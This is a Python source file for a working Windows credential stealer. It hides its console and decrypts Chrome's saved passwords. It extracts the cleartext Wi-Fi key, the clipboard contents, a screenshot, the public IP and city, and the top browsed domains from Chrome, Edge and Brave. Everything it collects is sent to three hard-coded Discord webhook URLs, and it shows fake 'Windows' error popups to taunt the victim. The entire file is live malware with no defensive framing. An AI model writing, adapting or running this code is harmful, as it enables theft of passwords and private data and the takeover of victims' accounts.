import os
import shutil
import socket
import sqlite3
import subprocess
from collections import Counter
from datetime import datetime, timezone
from urllib.parse import urlparse
import getpass
import platform
import requests
import psutil
import pyperclip
from PIL import ImageGrab
import json
import base64
import win32crypt
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

# ─── Stealth: hide console ──────────────────────────────────────────────────
import ctypes
import win32gui
import win32con

def hide_console():
    try:
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
    except:
        pass

hide_console()

# ──────────────────────────────────────────────────────────────────────────────

WIFI_WEBHOOK_URL = "https://discord.com/api/webhooks/1459378040332222702/fVl25Ogayf2gW9wAR3wuGRKwvI_o8lJm-WmqZdwgawIGxLeqUtE7Hbytp-hGhCVpCDQO"
SITES_WEBHOOK_URL = "https://discord.com/api/webhooks/1459381801494642763/_TweeXz2DCpwYJwlRnQuWzC6CP1hTm-3BW7A5Z0S6vrKm6LCC5F5S2ez8deNP5oeptzj"
INFO_WEBHOOK_URL = "https://discord.com/api/webhooks/1459083733616427060/f6SNkQxaSG4yPh6vFUPEFdqVAJEZBISicZvQCbSwFtErK5eeQWfJrf4V5id7VyLOZCgg"

HISTORY_PATHS = [
    os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data\Default\History"),
    os.path.expanduser(r"~\AppData\Local\Microsoft\Edge\User Data\Default\History"),
    os.path.expanduser(r"~\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History"),
]

# ─── Chrome password extraction ─────────────────────────────────────────────
def get_chrome_master_key():
    try:
        local_state_path = os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data\Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        encrypted_key = encrypted_key[5:]  # DPAPI
        master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return master_key
    except:
        return None

def decrypt_password(encrypted_value, master_key):
    try:
        if encrypted_value.startswith(b"v10") or encrypted_value.startswith(b"v11"):
            iv = encrypted_value[3:15]
            payload = encrypted_value[15:]
            cipher = AESGCM(master_key)
            return cipher.decrypt(iv, payload, None).decode(errors='ignore')
        else:
            return win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode(errors='ignore')
    except:
        return ""

def get_saved_passwords(limit=10):
    master_key = get_chrome_master_key()
    if not master_key:
        return "Failed to decrypt master key (Chrome running or protected?)"

    db_path = os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data\Default\Login Data")
    if not os.path.exists(db_path):
        return "Chrome Login Data not found"

    temp_db = "temp_logins.db"
    try:
        shutil.copy2(db_path, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("""
            SELECT origin_url, username_value, password_value
            FROM logins
            WHERE blacklisted_by_user = 0
            ORDER BY date_last_used DESC
            LIMIT ?
        """, (limit,))
        rows = cursor.fetchall()
        conn.close()

        if not rows:
            return "No saved passwords found"

        result = []
        for url, username, enc_pass in rows:
            if not enc_pass:
                continue
            plain = decrypt_password(enc_pass, master_key)
            if plain:
                result.append(f"{url}\n  • User: {username}\n  • Pass: {plain}")

        return "\n\n".join(result) if result else "No decryptable passwords"
    except Exception as e:
        return f"Error: {str(e)}"
    finally:
        if os.path.exists(temp_db):
            try:
                os.remove(temp_db)
            except:
                pass

# ──────────────────────────────────────────────────────────────────────────────

def get_current_wifi_info():
    if socket.gethostname().lower() == "unknown":
        return None, None
    try:
        info = subprocess.run(["netsh", "wlan", "show", "interfaces"],
                              capture_output=True, text=True, creationflags=0x08000000).stdout
        ssid = None
        for line in info.splitlines():
            if "SSID" in line and "BSSID" not in line:
                ssid = line.split(":", 1)[1].strip()
                break
        if not ssid:
            return None, None
        pw = subprocess.run(["netsh", "wlan", "show", "profile", f'name="{ssid}"', "key=clear"],
                            capture_output=True, text=True, creationflags=0x08000000).stdout
        password = "Not found / not saved"
        for line in pw.splitlines():
            if "Key Content" in line:
                password = line.split(":", 1)[1].strip()
                break
        return ssid, password
    except:
        return None, None

def build_wifi_message():
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    user = getpass.getuser()
    host = socket.gethostname()
    ssid, pw = get_current_wifi_info()
    if ssid is None:
        return f"**Wi-Fi Info** (failed)\n• {now}\n• {user} @ {host}\n\nCould not retrieve Wi-Fi info"
    return f"**Current Wi-Fi**\n• User: {user}\n• Host: {host}\n• Time: {now}\n\n**SSID:** {ssid}\n**Password:** `{pw}`"

def send_wifi_log():
    try:
        requests.post(WIFI_WEBHOOK_URL, json={"content": build_wifi_message()}, timeout=7)
    except:
        pass

def get_public_ip():
    try:
        return requests.get("https://api4.ipify.org", timeout=5).text
    except:
        return "Unavailable"

def get_city_from_ip(ip):
    if ip == "Unavailable":
        return "Unavailable"
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}", timeout=5).json()
        return r.get("city", "Unknown") if r.get("status") == "success" else "Unknown"
    except:
        return "Unknown"

def get_wifi_name():
    if platform.system() != "Windows":
        return "Unavailable (non-Windows)"
    try:
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE
        out = subprocess.check_output(["netsh", "wlan", "show", "interfaces"],
                                      text=True, startupinfo=startupinfo, encoding="utf-8", errors="ignore")
        for line in out.splitlines():
            if "SSID" in line and "BSSID" not in line and ":" in line:
                name = line.split(":", 1)[1].strip()
                return name if name else "Not connected"
        return "Not connected to WiFi"
    except:
        return "Unavailable"

def get_system_info():
    public_ip = get_public_ip()
    clipboard = pyperclip.paste() if pyperclip else "Unavailable"
    if clipboard and len(clipboard) > 1200:
        clipboard = clipboard[:1200] + "... (truncated)"

    screenshot_path = None
    try:
        img = ImageGrab.grab()
        screenshot_path = "tmp_scr.png"
        img.save(screenshot_path, "PNG")
    except:
        pass

    return {
        "os": f"{platform.system()} {platform.version()}",
        "device": "Laptop" if psutil.sensors_battery() else "Desktop/PC",
        "public_ip": public_ip,
        "city": get_city_from_ip(public_ip),
        "wifi": get_wifi_name(),
        "user": getpass.getuser(),
        "clipboard": clipboard,
        "screenshot": screenshot_path,
        "passwords": get_saved_passwords(),
    }

def send_message_to_webhook(url, msg, screenshot=None):
    data = {"content": msg}
    files = None
    fh = None
    if screenshot and os.path.exists(screenshot):
        fh = open(screenshot, "rb")
        files = {"file": ("screen.png", fh, "image/png")}
    try:
        requests.post(url, data=data, files=files, timeout=15)
    except:
        pass
    finally:
        if fh:
            fh.close()
        if screenshot and os.path.exists(screenshot):
            try:
                os.remove(screenshot)
            except:
                pass

def send_info_log():
    info = get_system_info()
    msg = (
        "**System Info**\n"
        f"• Host: {socket.gethostname()}\n"
        f"• User: {info['user']}\n"
        f"• OS: {info['os']}\n"
        f"• Type: {info['device']}\n"
        f"• Public IP: {info['public_ip']}\n"
        f"• City: {info['city']}\n"
        f"• WiFi: {info['wifi']}\n\n"
        f"**Clipboard**\n"
        f"```\n{info['clipboard']}\n```\n\n"
        f"**Saved Passwords (Chrome - last {10})**\n"
        f"```\n{info['passwords']}\n```"
    )
    send_message_to_webhook(INFO_WEBHOOK_URL, msg, info["screenshot"])

def extract_domain(url):
    try:
        domain = urlparse(url).netloc.lower()
        if domain.startswith("www."):
            domain = domain[4:]
        return domain if domain else ""
    except:
        return ""

def read_recent_visits(db_path, limit=100):
    if not os.path.exists(db_path):
        return []
    temp = "temp_hist.db"
    try:
        shutil.copy2(db_path, temp)
        with sqlite3.connect(temp) as conn:
            cursor = conn.cursor()
            base = datetime(1601, 1, 1, tzinfo=timezone.utc)
            threshold = int((datetime.now(timezone.utc) - base).total_seconds() * 1_000_000 - 35*86400*1_000_000)
            cursor.execute("""
                SELECT urls.url
                FROM visits
                JOIN urls ON visits.url = urls.id
                WHERE visits.visit_time > ?
                ORDER BY visits.visit_time DESC
                LIMIT ?
            """, (threshold, limit))
            return [row[0] for row in cursor.fetchall()]
    except:
        return []
    finally:
        if os.path.exists(temp):
            try:
                os.remove(temp)
            except:
                pass

def get_top_domains():
    all_urls = []
    for path in HISTORY_PATHS:
        all_urls.extend(read_recent_visits(path, 100))
    if not all_urls:
        return []
    domain_count = Counter(extract_domain(u) for u in all_urls if extract_domain(u))
    return domain_count.most_common(6)

def send_sites_log():
    top = get_top_domains()
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    if not top:
        msg = f"**Top Domains (recent)**\n{now}\nNo browser history readable"
    else:
        lines = [f"**Top Domains (last ~30 days)**  {now}"]
        for i, (domain, count) in enumerate(top, 1):
            lines.append(f"{i}. {domain}  —  {count:,} visits")
        msg = "\n".join(lines)
    try:
        requests.post(SITES_WEBHOOK_URL, json={"content": msg}, timeout=7)
    except:
        pass

# ─── Fake popups ─────────────────────────────────────────────────────────────
def show_fake_errors():
    try:
        import tkinter as tk
        from tkinter import messagebox
        root = tk.Tk()
        root.withdraw()
        u = getpass.getuser()
        ip = get_public_ip()
        messagebox.showerror("Windows", f"Thanks {u}")
        messagebox.showerror("Windows", f"{ip}")
        root.destroy()
    except:
        pass

# ─── Main ────────────────────────────────────────────────────────────────────
def main():
    show_fake_errors()
    send_wifi_log()
    send_info_log()
    send_sites_log()

if __name__ == "__main__":
    main()
